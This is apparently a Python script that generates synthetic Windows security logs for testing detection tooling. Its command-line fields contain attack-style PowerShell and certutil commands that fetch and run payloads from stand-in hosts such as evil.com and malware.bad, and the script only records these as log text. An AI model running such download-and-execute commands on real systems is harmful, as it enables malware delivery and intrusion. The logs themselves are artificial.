#!/usr/bin/env python3
"""
generate_logs.py — Synthetic Security Log Generator
Generates 1000+ Windows-style security events (Sysmon process create,
logon success/fail, network connections, account management).
Outputs NDJSON to data/synthetic_logs.ndjson
"""

import json
import os
import random
from datetime import datetime, timedelta, timezone

from faker import Faker

fake = Faker()
random.seed(42)
Faker.seed(42)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
NUM_LOGS = 1200
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data")
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "synthetic_logs.ndjson")

# Time window: last 7 days
END_TIME = datetime.now(timezone.utc)
START_TIME = END_TIME - timedelta(days=7)

# ---------------------------------------------------------------------------
# Reference Data
# ---------------------------------------------------------------------------
HOSTNAMES = [
    "WS-PC-001", "WS-PC-002", "WS-PC-003", "WS-PC-004", "WS-PC-005",
    "SRV-DC-01", "SRV-DC-02", "SRV-WEB-01", "SRV-DB-01", "SRV-FILE-01",
]

USERNAMES = [
    "jsmith", "agarcia", "mwilliams", "bjohnson", "klee",
    "admin", "svc_backup", "svc_sql", "SYSTEM", "LOCAL SERVICE",
]

PROCESSES = {
    "normal": [
        ("explorer.exe", "C:\\Windows\\explorer.exe"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
        ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
        ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
        ("Teams.exe", "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
        ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
    ],
    "suspicious": [
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        ("cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe"),
        ("mshta.exe", "C:\\Windows\\System32\\mshta.exe"),
        ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe"),
        ("wscript.exe", "C:\\Windows\\System32\\wscript.exe"),
    ],
}

POWERSHELL_COMMANDS = [
    "Get-Process", "Get-Service", "Get-EventLog -LogName Security",
    "Set-ExecutionPolicy Bypass -Scope Process",
    "Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe",
    "IEX (New-Object Net.WebClient).DownloadString('http://malware.bad/shell.ps1')",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "[System.Net.ServicePointManager]::SecurityProtocol = 'Tls12'",
    "Get-ADUser -Filter *",
    "whoami /all",
]

DEST_IPS_INTERNAL = ["10.0.1.10", "10.0.1.20", "10.0.2.50", "192.168.1.100", "172.16.0.5"]
DEST_IPS_EXTERNAL = ["185.220.101.45", "91.219.236.222", "45.33.32.156", "104.21.45.12", "198.51.100.78"]
DEST_PORTS = [80, 443, 8080, 22, 3389, 445, 53, 8443, 4444, 1337]

NETWORK_PROTOCOLS = ["tcp", "udp", "http", "https", "dns", "smb"]


def random_timestamp():
    """Generate a random timestamp within the time window."""
    delta = END_TIME - START_TIME
    random_seconds = random.randint(0, int(delta.total_seconds()))
    return (START_TIME + timedelta(seconds=random_seconds)).isoformat()


def random_source_ip():
    """Generate a random internal or external source IP."""
    if random.random() < 0.7:
        return f"10.0.{random.randint(1, 5)}.{random.randint(10, 250)}"
    return fake.ipv4_public()


# ---------------------------------------------------------------------------
# Event Generators
# ---------------------------------------------------------------------------
def generate_process_create():
    """Sysmon Event ID 1 — Process Create."""
    is_suspicious = random.random() < 0.15
    pool = PROCESSES["suspicious"] if is_suspicious else PROCESSES["normal"]
    proc_name, proc_path = random.choice(pool)
    user = random.choice(USERNAMES)
    host = random.choice(HOSTNAMES)

    command_line = proc_path
    if proc_name == "powershell.exe":
        command_line = f"powershell.exe -NoProfile -Command \"{random.choice(POWERSHELL_COMMANDS)}\""
    elif proc_name == "cmd.exe":
        command_line = f"cmd.exe /c {random.choice(['net user', 'ipconfig /all', 'tasklist', 'whoami'])}"
    elif proc_name == "certutil.exe":
        command_line = "certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\\Temp\\malware.exe"

    parent_name, parent_path = random.choice(PROCESSES["normal"])

    return {
        "@timestamp": random_timestamp(),
        "event": {
            "category": "process",
            "action": "process_create",
            "severity": 3 if is_suspicious else 1,
            "module": "sysmon",
            "dataset": "windows.sysmon",
        },
        "host": {"name": host, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": user, "domain": "CORP"},
        "process": {
            "name": proc_name,
            "pid": random.randint(1000, 65000),
            "executable": proc_path,
            "command_line": command_line,
            "parent": {"name": parent_name, "pid": random.randint(100, 5000)},
        },
        "message": f"Process created: {proc_name} by {user} on {host}",
        "tags": ["sysmon", "process"] + (["suspicious"] if is_suspicious else []),
    }


def generate_logon_event():
    """Windows Security Event ID 4624/4625 — Logon Success/Failure."""
    success = random.random() < 0.75
    user = random.choice(USERNAMES[:5])  # only human users
    host = random.choice(HOSTNAMES)
    src_ip = random_source_ip()

    return {
        "@timestamp": random_timestamp(),
        "event": {
            "category": "authentication",
            "action": "logon_success" if success else "logon_failure",
            "outcome": "success" if success else "failure",
            "severity": 1 if success else 2,
            "module": "windows_security",
            "dataset": "windows.security",
        },
        "host": {"name": host, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": user, "domain": "CORP"},
        "source": {"ip": src_ip, "port": random.randint(49152, 65535)},
        "message": f"{'Successful' if success else 'Failed'} logon for {user} from {src_ip} on {host}",
        "tags": ["authentication", "windows_security"],
    }


def generate_network_connection():
    """Sysmon Event ID 3 — Network Connection."""
    host = random.choice(HOSTNAMES)
    user = random.choice(USERNAMES)
    src_ip = f"10.0.{random.randint(1, 5)}.{random.randint(10, 250)}"
    is_external = random.random() < 0.3
    dest_ip = random.choice(DEST_IPS_EXTERNAL) if is_external else random.choice(DEST_IPS_INTERNAL)
    dest_port = random.choice(DEST_PORTS)
    protocol = random.choice(NETWORK_PROTOCOLS)

    proc_name, proc_path = random.choice(
        PROCESSES["normal"] + (PROCESSES["suspicious"] if random.random() < 0.1 else [])
    )

    event = {
        "@timestamp": random_timestamp(),
        "event": {
            "category": "network",
            "action": "network_connection",
            "severity": 2 if is_external else 1,
            "module": "sysmon",
            "dataset": "windows.sysmon",
        },
        "host": {"name": host, "os": {"name": "Windows", "version": "10.0.19045"}},
        "user": {"name": user, "domain": "CORP"},
        "source": {"ip": src_ip, "port": random.randint(49152, 65535)},
        "destination": {"ip": dest_ip, "port": dest_port},
        "network": {
            "protocol": protocol,
            "direction": "outbound" if is_external else "internal",
            "bytes": random.randint(64, 1048576),
        },
        "process": {
            "name": proc_name,
            "pid": random.randint(1000, 65000),
            "executable": proc_path,
        },
        "message": f"Network connection from {src_ip} to {dest_ip}:{dest_port} ({protocol}) by {proc_name}",
        "tags": ["network", "sysmon"] + (["external"] if is_external else []),
    }
    return event


def generate_account_management():
    """Windows Security Event — Account Management (4720, 4722, 4732)."""
    actions = [
        ("account_created", "A user account was created"),
        ("account_enabled", "A user account was enabled"),
        ("group_member_added", "A member was added to a security-enabled group"),
    ]
    action, description = random.choice(actions)
    target_user = fake.user_name()
    acting_user = random.choice(USERNAMES[:5])
    host = random.choice(HOSTNAMES[:2])  # usually on DCs
    is_admin = random.random() < 0.15

    return {
        "@timestamp": random_timestamp(),
        "event": {
            "category": "iam",
            "action": action,
            "severity": 3 if is_admin else 1,
            "module": "windows_security",
            "dataset": "windows.security",
        },
        "host": {"name": host, "os": {"name": "Windows Server", "version": "2019"}},
        "user": {"name": acting_user, "domain": "CORP"},
        "process": {
            "name": "lsass.exe",
            "pid": 672,
            "executable": "C:\\Windows\\System32\\lsass.exe",
        },
        "message": f"{description}: {target_user} by {acting_user} on {host}"
                   + (" (added to Administrators)" if is_admin else ""),
        "tags": ["iam", "account_management"] + (["admin_change"] if is_admin else []),
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
GENERATORS = [
    (generate_process_create, 0.30),
    (generate_logon_event, 0.35),
    (generate_network_connection, 0.25),
    (generate_account_management, 0.10),
]


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    events = []
    for _ in range(NUM_LOGS):
        r = random.random()
        cumulative = 0.0
        for gen_func, weight in GENERATORS:
            cumulative += weight
            if r <= cumulative:
                events.append(gen_func())
                break

    # Sort by timestamp for realism
    events.sort(key=lambda e: e["@timestamp"])

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    print(f"[✓] Generated {len(events)} synthetic security events")
    print(f"    Output: {OUTPUT_FILE}")

    # Quick stats
    categories = {}
    for e in events:
        cat = e["event"]["category"]
        categories[cat] = categories.get(cat, 0) + 1
    print("    Breakdown:")
    for cat, count in sorted(categories.items()):
        print(f"      {cat}: {count}")


if __name__ == "__main__":
    main()
